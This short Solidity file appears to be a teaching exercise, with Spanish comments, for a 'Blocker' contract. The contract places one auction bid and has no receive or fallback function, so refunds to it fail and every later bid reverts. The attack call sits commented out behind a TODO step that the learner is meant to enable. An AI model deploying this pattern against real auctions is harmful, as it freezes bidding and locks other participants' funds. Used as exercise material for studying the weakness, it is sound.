// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

interface IAuction {
    function bid() external payable;
}

// ¿Qué? Un pujador que no acepta ETH: no tiene `receive` ni `fallback`.
// ¿Para qué? Quedarse con la subasta pujando una vez: ninguna puja posterior puede
//   devolverle su ETH, así que todas revierten.
contract Blocker {
    /// @notice Puja en `auction` con el ETH que envías.
    // PASO 1: pujar desde este contrato.
    // Borra la línea del revert y descomenta la línea que empieza con `//> `.
    function attack(IAuction auction) external payable {
        revert("TODO: Paso 1");
        //> auction.bid{value: msg.value}();
    }
}
